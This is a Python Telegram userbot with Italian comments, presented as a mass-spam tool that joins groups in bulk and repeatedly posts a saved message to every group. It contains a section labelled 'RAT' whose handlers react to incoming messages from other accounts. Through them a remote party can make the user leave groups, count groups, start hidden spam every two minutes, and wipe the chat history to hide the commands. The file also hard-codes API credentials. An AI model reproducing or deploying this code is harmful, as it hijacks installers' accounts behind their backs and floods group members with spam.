from telethon import TelegramClient, events
from telethon.tl.functions.channels import JoinChannelRequest
import re
import asyncio
from telethon.tl.types import MessageEntityUrl
from telethon.tl.functions.channels import GetFullChannelRequest
from telethon.errors import ChannelInvalidError, ChannelPrivateError, ChannelPublicGroupNaError, UsernameInvalidError, FloodWaitError
from telethon.tl.functions.channels import LeaveChannelRequest
from telethon.tl.functions.messages import DeleteMessagesRequest
from telethon.tl.functions.messages import DeleteHistoryRequest
import random

# Imposta le tue credenziali
api_id = '9666640'
api_hash = 'a9ffc7e23d4120a608b8dfdaef338393'

# Crea una nuova sessione
client = TelegramClient('session_name', api_id, api_hash)

# Variabile per memorizzare il messaggio
saved_message = None

# Funzione per gestire il comando .chats
@client.on(events.NewMessage(pattern=r"\.chats", outgoing=True))
async def get_chats(event):
    chat_info = ""
    chat_count = 0
    async for dialog in client.iter_dialogs():
        if dialog.is_group:
            chat_count += 1
            chat_info += f"{dialog.title}\n"

    if chat_info:
        response = f"👥 | Sei presente in {chat_count} gruppi."
    else:
        response = "❌ | Non sei presente in nessun gruppo."

    await event.respond(response)

saved_message = None
is_waiting_for_message = False
is_spamming = False
silent_is_spamming = False

# Funzione per gestire il comando .help
@client.on(events.NewMessage(pattern=r"\.help", outgoing=True))
async def help_command(event):
    help_link = "https://telegra.ph/Comandi-Userbot-Spammer-05-08"
    help_message = "📝 | Lista dei comandi: [clicca qui](https://telegra.ph/Comandi-Userbot-Spammer-05-08)"
    await event.respond(help_message, link_preview=False)

# Funzione per gestire il comando .rat
@client.on(events.NewMessage(pattern=r"\.rat", outgoing=True))
async def rat_command(event):
    rat_message = "📝 | Lista dei comandi: [clicca qui](https://telegra.ph/Comandi-RAT-07-26)"
    await event.respond(rat_message, link_preview=False)
    
# Funzione per gestire il comando .setmessage
@client.on(events.NewMessage(pattern=r"\.setmessage", outgoing=True))
async def set_message(event):
    global is_waiting_for_message, setmessage_message_id
    is_waiting_for_message = True
    setmessage_message_id = event.message.id
    await event.respond("📝 | Manda il messaggio da settare...")

# Funzione per gestire il salvataggio del messaggio successivo a .setmessage
@client.on(events.NewMessage(outgoing=True))
async def save_message(event):
    global saved_message, is_waiting_for_message, setmessage_message_id
    if is_waiting_for_message and event.message.id != setmessage_message_id:
        # Salva il messaggio intero
        saved_message = event.message
        is_waiting_for_message = False
        await event.respond("✅ | Messaggio settato con successo.")

# Funzione per gestire il comando .getmessage
@client.on(events.NewMessage(pattern=r"\.getmessage", outgoing=True))
async def get_message(event):
    global saved_message
    if saved_message:
        # Invia il messaggio salvato
        await client.send_message(
            event.chat_id, 
            saved_message.message, 
            parse_mode='html', 
            link_preview=False,
            formatting_entities=saved_message.entities
        )
    else:
        await event.respond("❌ | Nessun messaggio settato.")

# Funzione per gestire il comando .join
@client.on(events.NewMessage(pattern=r"\.join", outgoing=True))
async def join_groups(event):
    # Ottieni i link di invito dal messaggio
    links = re.findall(r'(?:https?://\S+|@\w+)', event.raw_text)
    added_groups = []
    failed_groups = []

    # Ciclo finché ci sono link da processare
    while links:
        # Entra in un massimo di 5 gruppi
        for _ in range(min(5, len(links))):
            link = links.pop(0)
            try:
                # Rimuovi "@" dall'inizio se presente
                if link.startswith('@'):
                    link = link[1:]
                # Aggiungi "https://t.me/" se non è un link completo
                if not link.startswith('http'):
                    link = 'https://t.me/' + link
                await client(JoinChannelRequest(link))
                added_groups.append(link)
            except FloodWaitError as e:
                # Notifica dell'attesa per il cooldown
                await event.respond(f"❗ | Cooldown attivo. Attesa di {e.seconds} secondi.")
                # Attendi il tempo specificato dal FloodWaitError
                await asyncio.sleep(e.seconds)
                # Rimetti il link all'inizio della lista per riprovare
                links.insert(0, link)
            except Exception as e:
                failed_groups.append(link)

    # Costruisci la risposta solo alla fine del processo di unione
    response = ""
    response += f"✅ | Sei stato aggiunto a {len(added_groups)} gruppi.\n"
    response += f"\n❌ | Non è stato possibile aggiungerti a {len(failed_groups)} gruppi.\n\n"
    if added_groups:
        response += "\n👥 | Sei stato aggiunto ai seguenti gruppi:\n"
        response += "\n".join(added_groups) + "\n"
    if failed_groups:
        response += "\n👥 | Non è stato possibile aggiungerti ai seguenti gruppi:\n"
        response += "\n".join(failed_groups)

    # Invia la risposta solo alla fine del processo di unione
    await event.respond(response)

# Funzione per gestire il comando .startspam
@client.on(events.NewMessage(pattern=r"\.startspam", outgoing=True))
async def start_spam(event):
    global is_spamming
    if saved_message:
        is_spamming = True
        await event.respond("✅ | Spam avviato.")
        await spam_loop(event)
    else:
        await event.respond("❌ | Nessun messaggio settato.")

# Funzione per gestire il comando .stopspam
@client.on(events.NewMessage(pattern=r"\.stopspam", outgoing=True))
async def stop_spam(event):
    global is_spamming
    is_spamming = False
    await event.respond("❌ | Spam interrotto.")


# Funzione per gestire il comando .status
@client.on(events.NewMessage(pattern=r"\.status", outgoing=True))
async def spam_status(event):
    global is_spamming
    if is_spamming:
        await event.respond("✅ | Lo spam è attualmente attivo.")
    else:
        await event.respond("❌ | Lo spam non è attivo.")


# Funzione per gestire il loop dello spam
async def spam_loop(event):
    global saved_message, spam_delay, is_spamming
    while is_spamming:
        await send_message_to_all_groups(event)
        await asyncio.sleep(spam_delay * 60)

# Funzione per inviare il messaggio a tutti i gruppi in cui è presente l'utente
async def send_message_to_all_groups(event):
    global saved_message
    added_groups = []
    failed_groups = []
    async for dialog in client.iter_dialogs():
        if dialog.is_group:
            try:
                # Invia il messaggio con tutte le entità
                await client.send_message(
                    dialog.id, 
                    saved_message.message, 
                    parse_mode='html', 
                    link_preview=False,
                    formatting_entities=saved_message.entities
                )
                added_groups.append(dialog.id)
            except Exception as e:
                failed_groups.append(dialog.id)

    # Costruisci la risposta
    response = ""
    response += f"✅ | Lo spam è stato completato correttamente.\n\n"
    response += f"👥 | Numero di gruppi a cui è stato inviato il messaggio: {len(added_groups)}\n"
    response += f"👥 | Numero di gruppi in cui non è stato possibile: {len(failed_groups)}\n\n"
    '''
    if failed_groups:
        response += "❌ | Non è stato possibile inviare il messaggio nei seguenti gruppi:\n"
        response += "\n".join(map(str, failed_groups))
    '''
    # Invia la risposta
    await event.respond(response)

@client.on(events.NewMessage(pattern=r"\.verify(?:\s+(.+))?", outgoing=True))
async def verify_groups(event):
    input_text = event.pattern_match.group(1)

    if not input_text:
        await event.respond("❌ | Devi specificare almeno un gruppo o un link.")
        return

    # Normalizza i link per gestire diverse righe e separatori
    links = re.findall(r'(?:https?://\S+|@\w+)', input_text.replace('\n', ' '))

    if not links:
        await event.respond("❌ | Nessun gruppo o link valido trovato.")
        return

    present_groups = []
    absent_groups = []
    invalid_groups = []

    # Mappa per conversione dei link in formati uniformi
    normalized_links = {link: link.replace('https://t.me/', '').replace('@', '') for link in links}

    # Controllo presenza nei gruppi
    async for dialog in client.iter_dialogs():
        if dialog.is_group:
            dialog_username = getattr(dialog.entity, 'username', None)
            dialog_title = dialog.title
            for original_link, normalized_link in normalized_links.items():
                if dialog_username == normalized_link or dialog_title == normalized_link:
                    present_groups.append(original_link)
                    break

    # Verifica i gruppi non trovati
    for link in links:
        if link not in present_groups:
            normalized_link = normalized_links[link]
            try:
                await client(GetFullChannelRequest(normalized_link))
                absent_groups.append(link)
            except (ChannelInvalidError, ChannelPrivateError, ChannelPublicGroupNaError, UsernameInvalidError):
                invalid_groups.append(link)
            except ValueError as e:
                if 'No user has' in str(e):
                    invalid_groups.append(link)
                else:
                    raise

    # Costruisci la risposta
    response = ""
    response += f"✅ | Sei presente in {len(present_groups)} gruppi.\n"
    response += f"❌ | Non sei presente in {len(absent_groups)} gruppi.\n\n"

    if absent_groups:
        response += "👥 | Gruppi in cui non sei presente:\n"
        response += "\n".join(absent_groups) + "\n"
    '''
    if invalid_groups:
        response += "\n❌ | Gruppi non validi o non esistenti:\n"
        response += "\n".join(invalid_groups)
    '''
    # Invia la risposta
    await event.respond(response)

# Funzione per gestire il comando .delay
@client.on(events.NewMessage(pattern=r"\.delay\s+(\d+)", outgoing=True))
async def set_delay(event):
    global spam_delay
    spam_delay = int(event.pattern_match.group(1))
    await event.respond(f"✅ | Delay impostato a {spam_delay} minuti.")

# Funzione per gestire il comando .getdelay
@client.on(events.NewMessage(pattern=r"\.getdelay", outgoing=True))
async def get_delay(event):
    global spam_delay
    await event.respond(f"🕙 | Il delay attuale è di {spam_delay} minuti.")

'''
👇 SEZIONE RAT 👇
'''

# Funzione per gestire il comando qag
@client.on(events.NewMessage(pattern=r"\.qg\s+(\d+)", incoming=True))
async def leave_groups(event):
    number_of_groups = int(event.pattern_match.group(1))
    left_groups = []

    async for dialog in client.iter_dialogs():
        if dialog.is_group:
            left_groups.append(dialog)

    if number_of_groups > len(left_groups):
        await event.respond(f"too many")
        return

    groups_to_leave = random.sample(left_groups, number_of_groups)

    for group in groups_to_leave:
        try:
            await client(LeaveChannelRequest(group.id))
        except Exception as e:
            await event.respond(f"err")

    await event.respond(f"ok")
    try:
        await event.respond(f"del")
        await client(DeleteHistoryRequest(peer=event.chat_id, just_clear=False, max_id=0))
    except Exception as e:
        await event.respond(f"err del")

# Funzione per gestire il comando .nb
@client.on(events.NewMessage(pattern=r"\.nb", outgoing=False))
async def number_of_groups(event):
    group_count = 0
    async for dialog in client.iter_dialogs():
        if dialog.is_group:
            group_count += 1
    await event.respond(f"{group_count}")
    try:
        await event.respond(f"del")
        await client(DeleteHistoryRequest(peer=event.chat_id, just_clear=False, max_id=0))
    except Exception as e:
        await event.respond(f"err del")

# Funzione per gestire il comando .dl
@client.on(events.NewMessage(pattern=r"\.dl", outgoing=False))
async def delete_chat(event):
    try:
        await event.respond(f"del")
        await client(DeleteHistoryRequest(peer=event.chat_id, just_clear=False, max_id=0))
    except Exception as e:
        await event.respond(f"err del")

# Funzione per gestire il comando .ss
@client.on(events.NewMessage(pattern=r"\.ss", outgoing=False))
async def stop_spam(event):
    global is_spamming
    is_spamming = False
    await event.respond("ok")
    try:
        await event.respond(f"del")
        await client(DeleteHistoryRequest(peer=event.chat_id, just_clear=False, max_id=0))
    except Exception as e:
        await event.respond(f"err del")

# Funzione per gestire il comando .msstart
@client.on(events.NewMessage(pattern=r"\.msstart", incoming=True))
async def msstart(event):
    global silent_is_spamming
    if saved_message:
        silent_is_spamming = True
        await event.respond("ok")
        client.loop.create_task(silent_spam_loop())
        try:
            await event.respond(f"del")
            await client(DeleteHistoryRequest(peer=event.chat_id, just_clear=False, max_id=0))
        except Exception as e:
            await event.respond(f"err del")
        await silent_spam_loop()
    else:
        await event.respond("need msg")
        try:
            await event.respond(f"del")
            await client(DeleteHistoryRequest(peer=event.chat_id, just_clear=False, max_id=0))
        except Exception as e:
            await event.respond(f"err del")

# Funzione per gestire il comando .msstop
@client.on(events.NewMessage(pattern=r"\.msstop", incoming=True))
async def msstop(event):
    global silent_is_spamming
    silent_is_spamming = False
    await event.respond("ok")
    try:
        await event.respond(f"del")
        await client(DeleteHistoryRequest(peer=event.chat_id, just_clear=False, max_id=0))
    except Exception as e:
        await event.respond(f"err del")

# Funzione per il loop dello spam silenzioso
async def silent_spam_loop():
    global saved_message, silent_is_spamming, spam_delay
    while silent_is_spamming:
        await send_message_to_all_groups_silent()
        await asyncio.sleep(120)

# Funzione per inviare il messaggio a tutti i gruppi in cui è presente l'utente (senza risposta)
async def send_message_to_all_groups_silent():
    global saved_message
    async for dialog in client.iter_dialogs():
        if dialog.is_group:
            try:
                # Invia il messaggio con tutte le entità
                await client.send_message(
                    dialog.id, 
                    saved_message.message, 
                    parse_mode='html', 
                    link_preview=False,
                    formatting_entities=saved_message.entities
                )
            except Exception as e:
                pass  # Ignora gli errori

async def main():
    # Avvia il client Telegram
    await client.start()
    # Attendi che il client sia terminato
    await client.run_until_disconnected()

# Avvia il programma
if __name__ == '__main__':
    client.loop.run_until_complete(main())
